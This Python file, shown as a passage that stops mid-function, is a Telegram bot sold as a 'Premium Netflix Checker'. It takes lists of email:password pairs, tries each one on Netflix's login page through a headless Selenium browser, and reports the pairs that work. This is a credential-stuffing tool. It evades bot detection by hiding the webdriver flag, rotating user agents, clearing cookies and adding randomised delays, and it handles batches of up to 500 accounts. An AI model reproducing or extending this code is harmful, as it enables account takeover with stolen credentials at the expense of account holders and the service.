# 💎 𝗔n𝟬𝗡𝗢t𝗙 Premium Netflix Checker Bot
# Universal Multi-Platform Netflix Account Checker
# Developed in Kenya 🇰🇪 with 254 Vibes 💎
# Coded by @unknownnumeralx - The genius behind this premium script 💎

import os
import logging
import time
import random
import asyncio
from shutil import which
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.common.exceptions import WebDriverException, TimeoutException
import telegram
import requests
import socket
import sys

# Platform detection
def detect_platform():
    """Detect which platform we're running on"""
    if 'RAILWAY' in os.environ:
        return 'railway'
    elif 'RENDER' in os.environ:
        return 'render'
    elif 'HEROKU' in os.environ:
        return 'heroku'
    elif 'ANDROID_ROOT' in os.environ:
        return 'termux'
    elif os.path.exists('/etc/systemd/system/'):
        return 'vps'
    else:
        return 'unknown'

# Colorful logging setup
class PlatformFormatter(logging.Formatter):
    COLORS = {
        'railway': '\x1b[38;5;208m',  # Orange
        'render': '\x1b[38;5;45m',    # Blue
        'heroku': '\x1b[38;5;165m',   # Purple
        'termux': '\x1b[38;5;82m',    # Green
        'vps': '\x1b[38;5;196m',      # Red
    }
    RESET = '\x1b[0m'
    
    def format(self, record):
        platform = detect_platform()
        color = self.COLORS.get(platform, '')
        
        # Add platform prefix and color
        if any(keyword in record.getMessage().lower() for keyword in [
            'starting', 'developed by', 'geckodriver', 'application started', 
            'bot is now running', 'use /start', 'platform detected'
        ]):
            formatted_msg = f"{color}[{platform.upper()}] {record.msg}{self.RESET}"
            record.msg = formatted_msg
        return super().format(record)

# Set up logging
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# Remove existing handlers if any
for handler in logger.handlers[:]:
    logger.removeHandler(handler)

# Create handler with platform formatter
ch = logging.StreamHandler()
ch.setLevel(logging.INFO)
ch.setFormatter(PlatformFormatter())
logger.addHandler(ch)

class UniversalNetflixCheckerBot:
    def __init__(self, token):
        self.token = token
        self.platform = detect_platform()
        logger.info(f"🚀 Platform detected: {self.platform.upper()}")
        
        # Platform-specific configurations with proper timeout settings
        self.application = (Application.builder()
                           .token(token)
                           .concurrent_updates(False)
                           .get_updates_read_timeout(30)
                           .get_updates_write_timeout(30)
                           .get_updates_connect_timeout(30)
                           .get_updates_pool_timeout(30)
                           .build())
        self.user_agents = self.get_user_agents()
        self.geckodriver_path = self.find_geckodriver()
        self.working_accounts = []
        self.setup_handlers()
        
    def get_user_agents(self):
        return [
            'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        ]
    
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def find_geckodriver(self):
        """Find geckodriver across all platforms"""
        possible_paths = [
            which("geckodriver"),
            "/usr/local/bin/geckodriver",
            "/usr/bin/geckodriver",
            "/app/.geckodriver/bin/geckodriver",  # Railway
            "/opt/render/project/src/.geckodriver/bin/geckodriver",  # Render
            "/app/.apt/usr/bin/geckodriver",  # Heroku
            "/data/data/com.termux/files/usr/bin/geckodriver",  # Termux
            "./geckodriver",  # Local
            os.path.join(os.getcwd(), "geckodriver")  # Current directory
        ]
        
        for path in possible_paths:
            if path and os.path.exists(path):
                logger.info(f"✅ GeckoDriver found at: {path}")
                return path
        
        logger.error("❌ GeckoDriver not found in any standard location")
        return None

    def check_geckodriver_installation(self):
        """Check if geckodriver is properly installed"""
        return self.geckodriver_path is not None

    def check_network_connectivity(self):
        """Check if we can reach Netflix"""
        logger.info("🔍 Running network diagnostics...")
        
        # Test DNS resolution first
        try:
            socket.gethostbyname('www.netflix.com')
            logger.info("✅ DNS resolution: GOOD")
        except:
            logger.error("❌ DNS resolution: FAILED")
            return False
        
        # Test basic connectivity with requests
        try:
            response = requests.get("https://www.netflix.com", timeout=10)
            if response.status_code == 200:
                logger.info("✅ Network connectivity: GOOD")
                return True
            else:
                logger.warning("⚠️ Netflix returned status: %s", response.status_code)
        except Exception as e:
            logger.warning("⚠️ Direct HTTP request failed: %s", e)
        
        return True  # Still try even if requests fail
    
    def get_platform_optimized_driver(self):
        """Create Firefox driver optimized for current platform"""
        if not self.geckodriver_path:
            raise Exception("GeckoDriver not found. Please install it first.")
        
        firefox_options = FirefoxOptions()
        
        # UNIVERSAL SETTINGS
        firefox_options.add_argument("--headless")
        firefox_options.add_argument("--no-sandbox")
        firefox_options.add_argument("--disable-dev-shm-usage")
        firefox_options.add_argument("--disable-gpu")
        firefox_options.add_argument("--disable-extensions")
        firefox_options.add_argument("--disable-plugins")
        
        # 🔥 PRIVACY SETTINGS TO PREVENT CACHE/COOKIE PERSISTENCE
        firefox_options.set_preference("privacy.sanitize.sanitizeOnShutdown", True)
        firefox_options.set_preference("privacy.clearOnShutdown.cache", True)
        firefox_options.set_preference("privacy.clearOnShutdown.cookies", True)
        firefox_options.set_preference("privacy.clearOnShutdown.offlineApps", True)
        firefox_options.set_preference("privacy.clearOnShutdown.sessions", True)
        firefox_options.set_preference("privacy.clearOnShutdown.openWindows", True)
        firefox_options.set_preference("privacy.clearOnShutdown.downloads", True)
        firefox_options.set_preference("privacy.clearOnShutdown.formData", True)
        firefox_options.set_preference("privacy.clearOnShutdown.history", True)
        firefox_options.set_preference("privacy.clearOnShutdown.passwords", True)
        
        # DISABLE ALL CACHE
        firefox_options.set_preference("browser.cache.disk.enable", False)
        firefox_options.set_preference("browser.cache.memory.enable", False)
        firefox_options.set_preference("browser.cache.offline.enable", False)
        firefox_options.set_preference("network.http.use-cache", False)
        
        # PLATFORM-SPECIFIC OPTIMIZATIONS
        if self.platform in ['railway', 'render', 'heroku']:
            # Cloud platform optimizations
            firefox_options.add_argument("--single-process")
            firefox_options.set_preference("dom.ipc.processCount", 1)
            firefox_options.set_preference("javascript.options.mem.nursery.max_kb", 153600)
            logger.info("🔧 Applied cloud platform optimizations")
        elif self.platform == 'termux':
            # Termux optimizations (Android)
            firefox_options.add_argument("--single-process")
            firefox_options.set_preference("dom.ipc.processCount", 1)
            logger.info("🔧 Applied Termux optimizations")
        elif self.platform == 'vps':
            # VPS optimizations (more resources available)
            firefox_options.set_preference("dom.ipc.processCount", 2)
            logger.info("🔧 Applied VPS optimizations")
        
        # SECURITY & DETECTION AVOIDANCE
        firefox_options.set_preference("dom.webdriver.enabled", False)
        firefox_options.set_preference("useAutomationExtension", False)
        firefox_options.set_preference("media.volume_scale", "0.0")
        
        # Set user agent
        user_agent = self.get_random_user_agent()
        firefox_options.set_preference("general.useragent.override", user_agent)
        
        try:
            logger.info(f"🚀 Starting {self.platform.upper()}-Optimized Firefox Driver...")
            
            service_args = []
            if self.platform in ['railway', 'render', 'heroku']:
                service_args = ['--marionette-port', '2828']
            
            service = FirefoxService(
                executable_path=self.geckodriver_path,
                log_path=os.devnull,
                service_args=service_args
            )
            
            # PLATFORM-SPECIFIC TIMEOUTS
            driver = webdriver.Firefox(service=service, options=firefox_options)
            
            if self.platform in ['railway', 'render', 'heroku']:
                driver.set_page_load_timeout(30)
                driver.set_script_timeout(15)
            elif self.platform == 'termux':
                driver.set_page_load_timeout(45)
                driver.set_script_timeout(20)
            else:  # VPS and others
                driver.set_page_load_timeout(25)
                driver.set_script_timeout(15)
                
            driver.implicitly_wait(5)
            
            # Set window size
            driver.set_window_size(390, 844)
            
            logger.info(f"✅ {self.platform.upper()}-Optimized Firefox Driver started!")
            return driver
            
        except Exception as e:
            logger.error(f"❌ {self.platform.upper()} Firefox startup failed: {e}")
            raise Exception(f"Firefox failed on {self.platform}: {e}")

    def setup_handlers(self):
        """Setup Telegram bot command and message handlers"""
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_handler(CommandHandler("platform", self.platform_command))
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_accounts))
        self.application.add_handler(CallbackQueryHandler(self.button_callback))  # ← THIS FIXES BUTTONS!
        
        # Add error handler
        self.application.add_error_handler(self.error_handler)

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle ALL button callbacks"""
        query = update.callback_query
        await query.answer()  # This stops the loading animation
        
        if query.data == "status":
            await self.handle_status_callback(query)
        elif query.data == "platform":
            await self.handle_platform_callback(query)
        elif query.data == "back_to_start":
            await self.handle_back_to_start(query)
        else:
            await query.edit_message_text("❌ Unknown button action!")

    async def handle_status_callback(self, query):
        """Handle status button press"""
        driver_status = "✅ GeckoDriver READY!" if self.check_geckodriver_installation() else "❌ GeckoDriver NOT FOUND!"
        
        # Check network connectivity
        network_status = "✅ Network READY!" if await asyncio.get_event_loop().run_in_executor(None, self.check_network_connectivity) else "⚠️ Network issues detected"
        
        # Create buttons for status page
        keyboard = [
            [InlineKeyboardButton("🔄 Refresh Status", callback_data="status")],
            [InlineKeyboardButton("🌍 Platform Info", callback_data="platform")],
            [InlineKeyboardButton("🔙 Back to Start", callback_data="back_to_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🤖 **Live Bot Status** 🤖\n\n"
            f"🌍 **Platform:** `{self.platform.upper()}`\n"
            f"🔧 **GeckoDriver:** {driver_status}\n"
            f"📡 **Network:** {network_status}\n"
            f"⚡ **Performance:** Optimized for {self.platform}\n"
            f"🕒 **Uptime:** {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"👨‍💻 **DEV:** @unknownnumeralx\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    async def handle_platform_callback(self, query):
        """Handle platform info button press"""
        platform_info = {
            'railway': '🚄 Railway (Cloud) - Fast & Reliable',
            'render': '☁️ Render (Cloud) - Great Performance', 
            'heroku': '🦸 Heroku (Cloud) - Classic Choice',
            'termux': '📱 Termux (Android) - Mobile Power',
            'vps': '🖥️ VPS/Server - Maximum Performance',
            'unknown': '❓ Unknown Environment'
        }
        
        current_platform = platform_info.get(self.platform, '❓ Unknown Environment')
        
        # Create buttons for platform page
        keyboard = [
            [InlineKeyboardButton("🚀 Check Status", callback_data="status")],
            [InlineKeyboardButton("🔄 Current Platform", callback_data="platform")],
            [InlineKeyboardButton("🔙 Back to Start", callback_data="back_to_start")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🌍 **Platform Information** 🌍\n\n"
            f"**Current Platform:**\n{current_platform}\n\n"
            f"**Platform Code:** `{self.platform}`\n\n"
            f"**Supported Platforms:**\n"
            f"• 🚄 **Railway** - 100 accounts, Fast processing\n"
            f"• ☁️ **Render** - 100 accounts, Great speed\n"  
            f"• 🦸 **Heroku** - 50 accounts, Good performance\n"
            f"• 📱 **Termux** - 50 accounts, Mobile optimized\n"
            f"• 🖥️ **VPS** - 500 accounts, Maximum power\n\n"
            f"**Optimizations:** ✅ Active for {self.platform}\n"
            f"**Performance:** 🚀 Enhanced\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    async def handle_back_to_start(self, query):
        """Handle back to start button"""
        driver_status = "✅ GeckoDriver READY!" if self.check_geckodriver_installation() else "❌ GeckoDriver NOT FOUND!"
        network_status = "✅ Network READY!" if await asyncio.get_event_loop().run_in_executor(None, self.check_network_connectivity) else "⚠️ Network issues detected"
        
        # Recreate the original start keyboard
        keyboard = [
            [
                InlineKeyboardButton("⭐ Repository", url="https://github.com/heis448/netflix-checker-bot"),
                InlineKeyboardButton("👨‍💻 Developer", url="https://t.me/unknownnumeralx")
            ],
            [
                InlineKeyboardButton("📢 Channel", url="https://t.me/+NTvpFvT6cA8yODM0"),
                InlineKeyboardButton("🔔 Updates", url="https://t.me/+VhwPKJBsyisyY2Q0")
            ],
            [
                InlineKeyboardButton("🚀 Check Status", callback_data="status"),
                InlineKeyboardButton("🌍 Platform Info", callback_data="platform")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🎬 **💎 𝗔n𝟬𝗡𝗢t𝗙 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗡𝗘𝗧𝗙𝗟𝗜𝗑 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 💎**\n\n"
            f"🌍 **Platform:** {self.platform.upper()}\n"
            f"{driver_status}\n"
            f"{network_status}\n\n"
            "📁 Send me a .txt file OR direct text with accounts in format:\n"
            "`email:password`\n\n"
            "Each account on a new line.\n\n"
            "⚡ **Status:** ✅ READY\n"
            "👨‍💻 **DEV:** @unknownnumeralx\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle Telegram API errors"""
        error = context.error
        
        if isinstance(error, telegram.error.Conflict):
            logger.error("❌ Multiple bot instances detected! Stopping...")
            await self.application.stop()
            await self.application.shutdown()
            logger.info("✅ Bot stopped due to conflict. Please restart only one instance.")
        elif isinstance(error, telegram.error.NetworkError):
            logger.warning("🌐 Network error, retrying...")
        else:
            logger.error(f"⚠️ Unexpected error: {error}")

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command with inline buttons"""
        driver_status = "✅ GeckoDriver READY!" if self.check_geckodriver_installation() else "❌ GeckoDriver NOT FOUND!"
        
        # Check network connectivity
        network_status = "✅ Network READY!" if await asyncio.get_event_loop().run_in_executor(None, self.check_network_connectivity) else "⚠️ Network issues detected"
        
        platform_info = f"🌍 **Platform:** {self.platform.upper()}"
        
        # Create inline keyboard for start command
        keyboard = [
            [
                InlineKeyboardButton("⭐ Repository", url="https://github.com/heis448/netflix-checker-bot"),
                InlineKeyboardButton("👨‍💻 Developer", url="https://t.me/unknownnumeralx")
            ],
            [
                InlineKeyboardButton("📢 Channel", url="https://t.me/+NTvpFvT6cA8yODM0"),
                InlineKeyboardButton("🔔 Updates", url="https://t.me/+VhwPKJBsyisyY2Q0")
            ],
            [
                InlineKeyboardButton("🚀 Check Status", callback_data="status"),
                InlineKeyboardButton("🌍 Platform Info", callback_data="platform")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await update.message.reply_animation(
                animation="https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExMXU4a3oyend6b2trZnlmampmajNkb3l0cGFsNGZoNTl6NmY0cGJnZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/ORjfgiG9ZtxcQQwZzv/giphy.gif",
                caption=f"🎬 **💎 𝗔n𝟬𝗡𝗢t𝗙 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗡𝗘𝗧𝗙𝗟𝗜𝗑 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 💎**\n\n"
                       f"{platform_info}\n"
                       f"{driver_status}\n"
                       f"{network_status}\n\n"
                       "📁 Send me a .txt file OR direct text with accounts in format:\n"
                       "`email:password`\n\n"
                       "Each account on a new line.\n\n"
                       "⚡ **Status:** ✅ READY\n"
                       "👨‍💻 **DEV:** @unknownnumeralx\n\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        except:
            await update.message.reply_text(
                f"🎬 **💎 𝗔n𝟬𝗡𝗢t𝗙 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗡𝗘𝗧𝗙𝗟𝗜𝗑 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 💎**\n\n"
                f"{platform_info}\n"
                f"{driver_status}\n"
                f"{network_status}\n\n"
                "📁 Send me a .txt file OR direct text with accounts in format:\n"
                "`email:password`\n\n"
                "Each account on a new line.\n\n"
                "⚡ **Status:** ✅ READY\n"
                "👨‍💻 **DEV:** @unknownnumeralx\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        driver_status = "✅ GeckoDriver READY!" if self.check_geckodriver_installation() else "❌ GeckoDriver NOT FOUND!"
        network_status = "✅ Network READY!" if await asyncio.get_event_loop().run_in_executor(None, self.check_network_connectivity) else "⚠️ Network issues detected"
        
        await update.message.reply_text(
            f"🤖 **Bot Status**\n\n"
            f"🌍 **Platform:** {self.platform.upper()}\n"
            f"{driver_status}\n"
            f"{network_status}\n"
            f"🔧 **System:** Operational\n"
            f"⚡ **Performance:** Optimized for {self.platform}\n"
            f"👨‍💻 **DEV:** @unknownnumeralx\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.MARKDOWN
        )

    async def platform_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /platform command"""
        platform_info = {
            'railway': '🚄 Railway (Cloud)',
            'render': '☁️ Render (Cloud)',
            'heroku': '🦸 Heroku (Cloud)',
            'termux': '📱 Termux (Android)',
            'vps': '🖥️ VPS/Dedicated Server',
            'unknown': '❓ Unknown Environment'
        }
        
        current_platform = platform_info.get(self.platform, '❓ Unknown')
        
        await update.message.reply_text(
            f"🌍 **Platform Information**\n\n"
            f"**Current Platform:** {current_platform}\n"
            f"**Platform Code:** {self.platform}\n\n"
            f"**Supported Platforms:**\n"
            f"• 🚄 Railway\n"
            f"• ☁️ Render\n"
            f"• 🦸 Heroku\n"
            f"• 📱 Termux\n"
            f"• 🖥️ VPS/Server\n\n"
            f"**Optimizations:** ✅ Active\n"
            f"**Performance:** 🚀 Enhanced\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode=ParseMode.MARKDOWN
        )

    def create_progress_bar(self, percentage, length=20):
        """Create a visual progress bar"""
        filled = int(length * percentage / 100)
        empty = length - filled
        bar = "█" * filled + "▒" * empty
        return f"[{bar}] {percentage}%"

    async def update_progress(self, update: Update, context: ContextTypes.DEFAULT_TYPE, current: int, total: int, working_count: int = 0, failed_count: int = 0):
        """Update progress message"""
        percentage = min(100, int((current / total) * 100))
        progress_bar = self.create_progress_bar(percentage)
        
        status_message = (
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"[↯💎]𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗡𝗘𝗧𝗙𝗟𝗜𝗑 𝗖𝗛𝗘𝗖𝗞𝗘𝗥💎[{self.platform.upper()}]💎\n\n"
            f"[↯] 𝙎𝙩𝙖𝙩𝙪𝙨 ↯ Processing ({total} accounts) \n"
            f"{progress_bar}\n"
            f"[↯] 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 ↯ {working_count} found\n"
            f"[↯] 𝙁𝙖𝙞𝙡𝙚𝙙 ↯ {failed_count} accounts\n"
            f"[↯] 𝙋𝙡𝙖𝙩𝙛𝙤𝙧𝙢 ↯ {self.platform}\n"
            f"[↯] 𝘿𝙀𝙑   ↯ @unknownnumeralx \n"
            "━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id'],
                    text=status_message
                )
            except Exception as e:
                new_message = await update.message.reply_text(status_message)
                context.user_data['progress_message_id'] = new_message.message_id
        else:
            new_message = await update.message.reply_text(status_message)
            context.user_data['progress_message_id'] = new_message.message_id

    async def cleanup_progress(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Clean up progress message"""
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
                del context.user_data['progress_message_id']
            except Exception as e:
                logger.warning("Could not delete progress message: %s", e)

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle document messages (txt files)"""
        user = update.message.from_user
        logger.info("User %s sent a file", user.first_name)

        if not update.message.document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Please send a .txt file")
            return

        await update.message.reply_text("📥 File received! Starting account verification...")

        try:
            file = await update.message.document.get_file()
            file_path = f"temp_{update.message.document.file_name}"
            await file.download_to_drive(file_path)

            working_accounts = await self.process_accounts(file_path, update, context)

            # Send final results with inline buttons
            if working_accounts:
                result_message, reply_markup = self.format_results(working_accounts)
                if len(result_message) > 4000:
                    # For long messages, split text but keep buttons on last part
                    parts = [result_message[i:i+4000] for i in range(0, len(result_message), 4000)]
                    for i, part in enumerate(parts):
                        if i == len(parts) - 1:  # Last part gets the buttons
                            await update.message.reply_text(part, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
                        else:
                            await update.message.reply_text(part, parse_mode=ParseMode.MARKDOWN)
                else:
                    await update.message.reply_text(result_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
            else:
                await update.message.reply_text("❌ No working accounts found.")

            if os.path.exists(file_path):
                os.remove(file_path)
                
            await self.cleanup_progress(update, context)

        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
            logger.error("Error: %s", str(e))
            await self.cleanup_progress(update, context)

    async def handle_text_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages with accounts"""
        user = update.message.from_user
        text = update.message.text.strip()
        logger.info("User %s sent text accounts", user.first_name)

        if ':' not in text and '\n' not in text:
            await update.message.reply_text(
                "📁 Send me accounts in format:\n"
                "`email:password`\n\n"
                "Example:\n"
                "user1@gmail.com:password123\n"
                "user2@yahoo.com:pass456\n"
                "user3@hotmail.com:secret789\n\n"
                "Or send a .txt file with the same format.",
                parse_mode=ParseMode.MARKDOWN
            )
            return

        await update.message.reply_text("📥 Text accounts received! Starting verification...")

        file_path = f"temp_text_{user.id}_{int(time.time())}.txt"
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(text)

            working_accounts = await self.process_accounts(file_path, update, context)

            # Send final results with inline buttons
            if working_accounts:
                result_message, reply_markup = self.format_results(working_accounts)
                if len(result_message) > 4000:
                    parts = [result_message[i:i+4000] for i in range(0, len(result_message), 4000)]
                    for i, part in enumerate(parts):
                        if i == len(parts) - 1:
                            await update.message.reply_text(part, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
                        else:
                            await update.message.reply_text(part, parse_mode=ParseMode.MARKDOWN)
                else:
                    await update.message.reply_text(result_message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
            else:
                await update.message.reply_text("❌ No working accounts found.")

        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
            logger.error("Error: %s", str(e))
        finally:
            if os.path.exists(file_path):
                os.remove(file_path)
            await self.cleanup_progress(update, context)

    def format_results(self, working_accounts):
        """Format working accounts for display with inline buttons"""
        if not working_accounts:
            return "❌ No working accounts found.", None
        
        result = "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        result += "🎬 **💎 𝗔n𝟬𝗡𝗢t𝗙 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗡𝗘𝗧𝗙𝗟𝗜𝗑 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 💎**\n\n"
        result += "✅ **WORKING ACCOUNTS** ✅\n\n"
        
        for i, (email, password) in enumerate(working_accounts, 1):
            result += f"**{i}.** `{email}:{password}`\n"
        
        result += f"\n📊 **Total Working:** {len(working_accounts)}\n"
        result += f"🌍 **Platform:** {self.platform.upper()}\n"
        result += "💫 **Thanks for using This Premium Script**\n\n"
        result += "━━━━━━━━━━━━━━━━━━━━━━━━"
        
        # Create inline keyboard buttons
        keyboard = [
            [
                InlineKeyboardButton("⭐ Visit Repository", url="https://github.com/heis448/netflix-checker-bot"),
                InlineKeyboardButton("👨‍💻 Developer", url="https://t.me/unknownnumeralx")
            ],
            [
                InlineKeyboardButton("📢 Join Channel", url="https://t.me/+NTvpFvT6cA8yODM0"),
                InlineKeyboardButton("🔔 Updates", url="https://t.me/+VhwPKJBsyisyY2Q0")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        return result, reply_markup

    async def process_accounts(self, file_path, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process accounts from file with network check"""
        
        # Check network before starting
        network_ok = await asyncio.get_event_loop().run_in_executor(
            None, self.check_network_connectivity
        )
        
        if not network_ok:
            await update.message.reply_text(
                "❌ **Network Connection Issue**\n\n"
                "Cannot reach Netflix servers. Possible reasons:\n"
                "• Network firewall blocking Netflix\n"
                "• DNS resolution issues\n"
                "• IP address blocked by Netflix\n"
                "• Server network restrictions\n\n"
                "Trying anyway with enhanced retry logic..."
            )
        
        working_accounts = []
        failed_accounts = 0
        
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                accounts = [line.strip() for line in file if ':' in line.strip()]
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {str(e)}")
            return []
        
        total_accounts = len(accounts)
        if total_accounts == 0:
            await update.message.reply_text("❌ No valid accounts found. Format should be email:password")
            return []
        
        # Platform-specific batch limits
        batch_limits = {
            'railway': 100,
            'render': 100,
            'heroku': 100,
            'termux': 50,
            'vps': 500,
            'unknown': 100
        }
        
        max_accounts = batch_limits.get(self.platform, 100)
        if total_accounts > max_accounts:
            await update.message.reply_text(
                f"⚠️ **Large Batch Notice**\n\n"
                f"Platform: {self.platform.upper()}\n"
                f"Accounts: {total_accounts}\n"
                f"Recommended: {max_accounts}\n\n"
                f"⏰ **Estimated Time:** {total_accounts * 25 // 60} minutes\n"
                f"🔧 **Optimizing for {self.platform}...**"
            )
            
        await update.message.reply_text(f"🔍 Found {total_accounts} accounts to test on {self.platform.upper()}...")
        await self.update_progress(update, context, 0, total_accounts, len(working_accounts), failed_accounts)

        for i, line in enumerate(accounts, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
            except ValueError:
                logger.warning("Invalid format: %s", line)
                failed_accounts += 1
                continue
            
            await self.update_progress(update, context, i, total_accounts, len(working_accounts), failed_accounts)
            
            # Platform-specific delays
            delay_ranges = {
                'railway': (3.0, 6.0),
                'render': (3.0, 6.0),
                'heroku': (4.0, 8.0),
                'termux': (5.0, 10.0),
                'vps': (2.0, 4.0),
                'unknown': (3.0, 6.0)
            }
            
            if i > 1:
                min_delay, max_delay = delay_ranges.get(self.platform, (3.0, 6.0))
                delay = random.uniform(min_delay, max_delay)
                await asyncio.sleep(delay)
            
            try:
                success, message = await asyncio.get_event_loop().run_in_executor(
                    None, self.test_netflix_account_detailed, email, password
                )
                if success:
                    working_accounts.append((email, password))
                    logger.info("🎉 WORKING: %s", email)
                else:
                    failed_accounts += 1
                    logger.info("❌ FAILED: %s - %s", email, message)
                    
            except Exception as e:
                failed_accounts += 1
                logger.error("🚨 ERROR: %s - %s", email, e)

        # Final results
        logger.info("📊 FINAL: %d working, %d failed out of %d total on %s", 
                    len(working_accounts), failed_accounts, total_accounts, self.platform)
        
        if working_accounts:
            logger.info("✅ WORKING ACCOUNTS:")
            for email, password in working_accounts:
                logger.info("   📧 %s", email)
        
        return working_accounts

    def test_netflix_account_detailed(self, email, password):
        """Universal Netflix testing with PROPER browser cleanup timing"""
        driver = None
        max_retries = 2
        
        for attempt in range(max_retries):
            try:
                driver = self.get_platform_optimized_driver()
                logger.info("🆕 NEW SESSION: Testing %s (Attempt %d/%d on %s)", email, attempt + 1, max_retries, self.platform)
                
                # 🎯 ORIGINAL NETFLIX URLs - NO MODIFICATIONS
                netflix_urls = [
                    "https://www.netflix.com/login",
                    "https://netflix.com/login",
                    "https://www.netflix.com/ke/login",
                    "https://netflix.com/"
                ]
                
                success = False
                for current_url in netflix_urls:
                    try:
                        logger.info("🌐 Trying URL: %s", current_url)
                        
                        driver.set_page_load_timeout(25)
                        driver.get(current_url)
                        
                        WebDriverWait(driver, 10).until(
                            lambda d: d.execute_script("return document.readyState") == "complete"
                        )
                        
                        if "netflix" in driver.current_url.lower():
                            logger.info("✅ Netflix page loaded successfully")
                            success = True
                            break
                        
                    except TimeoutException:
                        logger.warning("⚠️ Timeout loading: %s", current_url)
                        continue
                    except Exception as e:
                        logger.warning("⚠️ Error loading %s: %s", current_url, e)
                        continue
                
                if not success:
                    if attempt < max_retries - 1:
                        logger.info("🔄 Retrying after page load failure...")
                        if driver:
                            self.cleanup_driver_simple(driver)
                        continue
                    else:
